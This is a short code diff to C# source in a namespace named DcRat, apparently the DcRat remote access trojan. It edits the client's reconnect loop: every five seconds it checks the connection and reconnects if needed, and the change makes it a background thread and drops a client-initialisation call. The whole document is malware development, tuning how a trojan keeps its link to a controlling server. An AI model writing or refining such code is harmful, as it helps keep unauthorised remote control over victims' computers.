@@ -354,7 +354,7 @@ namespace DcRat
                 formInit.ShowDialog();
             }
             
-            new Thread(() =>
+            Thread thread = new Thread(() =>
             {
                 while (true)
                 {
@@ -363,13 +363,14 @@ namespace DcRat
                         if (!Connection.IsConnected)
                         {
                             Connection.Reconnect();
-                            Connection.InitializeClient();
                         }
                     }
                     catch { }
                     Thread.Sleep(5000);
                 }
-            }).Start();
+            });
+            thread.IsBackground = true;
+            thread.Start();
         }
     }
 }
